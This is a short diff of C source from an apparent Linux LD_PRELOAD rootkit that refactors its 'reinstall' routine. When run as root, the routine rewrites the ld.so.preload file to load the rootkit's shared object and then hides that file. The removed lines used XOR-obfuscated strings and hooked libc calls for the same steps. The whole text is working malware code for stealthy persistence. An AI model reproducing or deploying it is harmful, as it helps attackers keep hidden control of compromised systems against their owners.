@@ -23,37 +23,18 @@ int ld_inconsistent(void)
     return inconsistent;
 }
 
-FILE *get_ldfp(void)
-{
-    if(!ld_inconsistent()) return NULL;
-
-    FILE *ldfp;
-    hook(CFOPEN);
-    xor(ldpreload, LDSO_PRELOAD);
-    ldfp = call(CFOPEN, ldpreload, "w");
-    clean(ldpreload);
-    return ldfp;
-}
-
 void reinstall(void)
 {
-    if(not_user(0)) return;
+    if(not_user(0) || !ld_inconsistent()) return;
 
-    FILE *ldfp = get_ldfp();
-
-    hook(CFWRITE);
+    FILE *ldfp = xfopen(LDSO_PRELOAD, "w");
 
     if(ldfp != NULL){
-        xor(sopath, SOPATH);
-        xor(ldpreload, LDSO_PRELOAD);
-
-        (void)call(CFWRITE, sopath, strlen(sopath), 1, ldfp);
+        xfwrite(SOPATH, 1, ldfp);
         (void)fflush(ldfp);
         (void)fclose(ldfp);
 
-        hide_path(ldpreload);
-        clean(ldpreload);
-        clean(sopath);
+        xhide_path(LDSO_PRELOAD);
     }
 
     return;
